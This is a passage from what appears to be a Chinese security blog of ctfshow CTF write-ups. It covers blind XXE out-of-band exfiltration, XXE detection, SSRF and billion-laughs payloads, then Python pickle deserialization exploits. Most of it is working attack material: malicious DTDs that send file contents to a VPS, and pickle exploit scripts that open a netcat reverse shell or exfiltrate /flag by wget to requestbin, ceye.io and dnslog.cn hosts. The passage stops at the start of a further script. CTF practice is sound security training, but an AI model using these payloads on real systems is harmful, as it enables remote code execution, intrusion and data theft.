<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p><strong>evil.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p>
<p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p>
<p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p>
<p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p>
<p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p>
<p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p>
<p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p>
<p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p>
<h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>相比较于上一道有回显的题目，差别在于删除了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br></pre></td></tr></table></figure>

<p>我们的做法是将flag外带</p>
<p><del>由于新人第一次接触反弹Shell的做法，就将接下来的步骤写的详细一些了</del></p>
<p>如果是腾讯云的vps，要现在防火墙将所有端口开放</p>
<p><img src="https://s2.loli.net/2024/03/13/t3vQkyRPYEoSFOI.png" alt="image-20240313173756361"></p>
<p>启动vps后在特定宽口开放http服务，以便通过外网能访问到你的恶意文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>

<p>此时我们访问一下 <a href="http://vps-ip:8000/">http://vps-ip:8000</a> 试试看：（未有特殊说明则默认开放8000端口，ip为vps公网的ip）</p>
<p><img src="https://s2.loli.net/2024/03/13/q4QxSDGbpXnMOEv.png" alt="image-20240313153456749"></p>
<p>此时</p>
<p><img src="https://s2.loli.net/2024/03/13/AyUs89x3OrngBFe.png" alt="image-20240313154259477"></p>
<p>说明8000端口启动http服务成功</p>
<p>同理我们来测试1234端口：</p>
<p><img src="https://s2.loli.net/2024/03/13/A6UcgXZFuofS2Bv.png" alt="image-20240313154326926"></p>
<p>说明1234端口也启动http服务成功</p>
<p>创建XXE.dtd文件并写入如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim XXE.dtd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#XXE.dtd</span><br><span class="line">#shift+i</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">#esc</span><br><span class="line">#shift+: 输入wq保存退出</span><br></pre></td></tr></table></figure>

<p>在另一个页面监听本地1234端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/13/czXb29IgDC4wZFL.png" alt="image-20240313154810747"></p>
<p>burp发包内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 2299db75-d9fe-416f-959d-406b131ae701.challenge.ctf.show</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/13/G4Q5JhVHnozk1M6.png" alt="image-20240313161738958"></p>
<p>在监听的页面就可以看到加密后的flag</p>
<p><img src="https://s2.loli.net/2024/03/13/R24VpE8F6yLnZdC.png" alt="image-20240313155739020"></p>
<p>解密后得到flag</p>
<p><img src="https://s2.loli.net/2024/03/13/VBZqvXIb3kepYiA.png" alt="image-20240313155848778"></p>
<p>对payload的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>定义了两个实体：</p>
<ol>
<li><p><code>%file</code>：它使用php过滤器读取系统文件<code>/flag</code>的内容，并对内容进行base64编码。</p>
</li>
<li><p><code>%dtd</code>：它从远程URL <code>http://vps-ip:8000/XXE.dtd</code>加载DTD文件。</p>
</li>
</ol>
<p>以下是jay17师傅的解释（实体名有所改动）：</p>
<ol>
<li>不能直接<code>&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/%file&quot;&gt; </code>，因为默认不允许把本地文件发送到远程dtd里面，需要绕一圈，绕过这个限制</li>
<li><code>%dtd;</code>会读取远程dtd文件，读到了以后，因为远程dtd文件有一个<code>% all</code>实体的定义，那么就会解析这个实体定义。<code>% all</code>实体的定义内容是另外一个实体<code>% send</code>定义，那就会解析<code>% send</code>，就会执行远程请求，请求地址<code>http://vps-ip:8000/%file</code>，会在我们的 vps 日志上留下痕迹。<br>也可以起 nc 监听端口，能判断是否有向我们的 vps 发送请求以及请求内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send  SYSTEM &#x27;http://vps-ip:1234/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>&amp;#x25;</code> 就是百分号，因为是嵌套在里面的引用，不能直接写百分号</li>
<li><code>%all</code>实体定义了一个新的实体<code>send</code>，其内容是一个SYSTEM类型的实体，用于发送数据到指定的URL。在这里，<code>%file</code>实体被引用在URL中，以便将<code>/flag</code>文件的内容发送到指定的<code>http://vps-ip:1234/</code>地址。</li>
<li>在XML文档的解析过程中，通过引用<code>%all</code>实体，实际上定义了一个名为<code>send</code>的实体，其值是将<code>/flag</code>文件内容发送到指定URL的操作。</li>
<li>最后，通过引用<code>%send</code>实体，实际上执行了之前定义的<code>send</code>实体，将<code>/flag</code>文件的内容发送到指定的URL。</li>
</ol>
<h3 id="XXE检测："><a href="#XXE检测：" class="headerlink" title="XXE检测："></a>XXE检测：</h3><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p>
<p>首先检测XML是否会被成功解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/12/20/zScwHxmoaDt2hqJ.png" alt="image-20231008194425489"></p>
<p>如果数据包或页面中存在“Hello XXE”的字样，则表名实体已被解析。</p>
<p><img src="https://s2.loli.net/2023/12/20/WV5Z1hPgBNuRQU3.png" alt="image-20231008194500250"></p>
<p>接下来检测该端点是否支持DTD引用外部实体：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;http://localhost/tp5/test.xml&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>此时通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的HTTP request。</p>
<p><img src="https://s2.loli.net/2023/12/20/OxmH3Qjp9ahRWPK.png" alt="image-20231008210523538"></p>
<p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p>
<h3 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h3><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
<p>当然也可以用来探测端口信息，根据响应包的信息，若非“connection refused”则表示该端口可能是开放的。</p>
<p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。关于ncat的使用：ncat-网络工具中的“瑞士军刀”</p>
<p>用ncat在自己的服务器上开启监听：ncat -lvkp 8081(端口可自定义)</p>
<p>之后便可使用以下语句尝试是否能够建立连接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:8081/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DDoS："><a href="#DDoS：" class="headerlink" title="DDoS："></a>DDoS：</h3><p>支持实体测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
<h3 id="Billion-Laughs-攻击："><a href="#Billion-Laughs-攻击：" class="headerlink" title="Billion Laughs 攻击："></a>Billion Laughs 攻击：</h3><p>一个经典的Dos攻击payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">        ...... </span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
<p>当XML解析器加载该文档时，它会看到它包含一个根元素 “lolz” ，该元素包含文本 “&lol9;” 。然而，“&lol9;” 是一个已定义的实体，它扩展为包含十个 “&lol8;” 字符串。每个 “&lol8;” 字符串都是一个已定义的实体，可以扩展到10个 “&lol7;” 字符串，以此类推。在处理完所有的实体扩展之后，这个小（小于1 KB）的XML块实际上将包含 109 &#x3D; 10亿个 “lol” ，占用了将近 3 gb 的内存。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD 简介 (w3school.com.cn)</a></p>
<p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUhG+KG=DceorD3D&alichlgref=https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/389550468">XXE知识总结，有这篇就够了！ - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Jayjay___/article/details/132146130">Ctfshow web入门 XXE 模板注入篇 web373-web378 详细题解 全_ctfshow web373-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/uuzeray/article/details/134641792">【Web】CTFSHOW XXE刷题记录(全)-CSDN博客</a></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow python反序列化 刷题记录</title>
    <url>/2024/03/25/ctfshow%20python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h1><p><img src="https://s2.loli.net/2024/03/22/KtLTjnsRNxovg54.png" alt="image-20240322142018874"></p>
<p>进入靶场会看到<code>where is flag?</code>，Ctrl+U 检查源代码后可以看到注释的 html 标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到 <code>pickle.loads</code> 就知道是 python 反序列化没跑了。</p>
<p>先看给的提示：传入的 data 先进行 base64 解码后在进行反序列化，所以我们序列化完成之后还要额外进行 base64 编码</p>
<p>先简单的写一个爬虫脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><code>params</code> 的作用是将请求中的参数添加到 URL 中，以便将这些参数传递给服务器。在这种情况下，<code>params</code> 是一个字典，包含了要作为查询字符串添加到 URL 中的参数。最终的 URL 将包含这些参数，以便服务器可以根据这些参数来处理请求。</p>
<p><img src="https://s2.loli.net/2024/03/25/aQXqUsPznAtljSu.png" alt="image-20240325161132826"></p>
<p>无论是<code>ls /</code>还是<code>cat /flag</code>，回显都是 backdoor here：说明是一道 ”无回显“ 的题目。</p>
<p>有两种方法：反弹 shell 和 的 dns 外带</p>
<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;nc vps-ip port -e /bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>然后先再 vps 上开启对应端口的监听在运行脚本（否则会报错）</p>
<p>以1234端口为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/25/LCyvSGJfg9Epw3q.png" alt="image-20240325162846097"></p>
<p>运行脚本后则会显示：</p>
<p><img src="https://s2.loli.net/2024/03/25/SiwdO6NEAnYuMve.png" alt="image-20240325162614566"></p>
<p>此时就可以输入 Linux 命令来读取 flag 啦</p>
<p><img src="https://s2.loli.net/2024/03/25/stgkjELFWx4zRCY.png" alt="image-20240325162748641"></p>
<h2 id="dns-外带"><a href="#dns-外带" class="headerlink" title="dns 外带"></a>dns 外带</h2><h3 id="RequestBin"><a href="#RequestBin" class="headerlink" title="RequestBin"></a>RequestBin</h3><p>网址：<a href="http://requestbin.cn/">RequestBin — Collect, inspect and debug HTTP requests and webhooks</a></p>
<p>先点击 Create a RequestBin 获取一个 url</p>
<p>同样只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget http://requestbin.cn:80/1cpartx1?a=`cat /flag`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p><code>wget</code>是一个在命令行下使用的下载工具，它可以从指定的URL下载文件。</p>
<p>运行脚本就能得到 flag</p>
<p><img src="https://s2.loli.net/2024/03/25/YGwpP7oOaM9IK52.png" alt="image-20240325170204095"></p>
<h3 id="CEYE"><a href="#CEYE" class="headerlink" title="CEYE"></a>CEYE</h3><p>网址：<a href="http://ceye.io/">CEYE - Monitor service for security testing</a></p>
<p>可以稍微参考一下这篇文章：<a href="https://blog.csdn.net/weixin_46706771/article/details/119031343">RCE绕过之无回显-CSDN博客</a>，也可以在 <a href="http://ceye.io/payloads">http://ceye.io/payloads</a> 中找相对应的 payload</p>
<p>在 <a href="http://ceye.io/profile">http://ceye.io/profile</a> 下的 Identifier 可以获取对应 url</p>
<p>同样只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.zrne70.ceye.io&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>在 <a href="http://ceye.io/records/dns">http://ceye.io/records/dns</a> 即可找到 flag</p>
<p><img src="https://s2.loli.net/2024/03/25/Uf6brd5ZWoIgSEa.png" alt="yqftM9pg8duAUEF"></p>
<h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>网址：<a href="http://www.dnslog.cn/">DNSLog Platform</a></p>
<p>先点击 Get SubDomain 获取一个 url</p>
<p>同样只需将脚本稍微改一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.n4jlw3.dnslog.cn&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>运行脚本后，回到 DNSlog 平台，点击 Refresh Record 就可看到被拼接的 flag</p>
<p><img src="https://s2.loli.net/2024/03/27/ZoxwrS8jdOpfTyE.png" alt="image-20240327153137694"></p>
<p>我还有其他想法：既然是命令执行，为什么不尝试一下无回显 RCE 中那些获取 flag 的方式？</p>
<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p>用如下指令将 flag 的内容上传到 vps 中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag | scp -q -P port_number -i /path/to/private_key_file - user@vps_ip:/path/on/vps/</span><br></pre></td></tr></table></figure>

<p>这个命令的含义是将本地计算机上的<code>/flag</code>文件传输到远程VPS服务器上的指定路径。下面是命令中各个部分的解释：</p>
<ul>
<li><code>cat /flag</code>: 使用<code>cat</code>命令读取<code>/flag</code>文件的内容。</li>
<li><code>|</code>: 管道符号，将<code>cat /flag</code>的输出作为输入传递给下一个命令。</li>
<li><code>scp</code>: 用于在本地计算机和远程服务器之间安全地复制文件的命令。</li>
<li><code>-q</code>: 在<code>scp</code>命令中使用<code>-q</code>参数表示安静模式，即不显示传输过程的详细信息。</li>
<li><code>-P port_number</code>: 指定远程服务器的端口号。</li>
<li><code>-i /path/to/private_key_file</code>: 指定用于身份验证的私钥文件的路径。</li>
<li><code>user@vps_ip</code>: 远程VPS服务器的用户名和IP地址。</li>
<li><code>:/path/on/vps/</code>: 在远程VPS服务器上指定的路径，将文件传输到该路径。</li>
</ul>
<p>更改下脚本：</p>
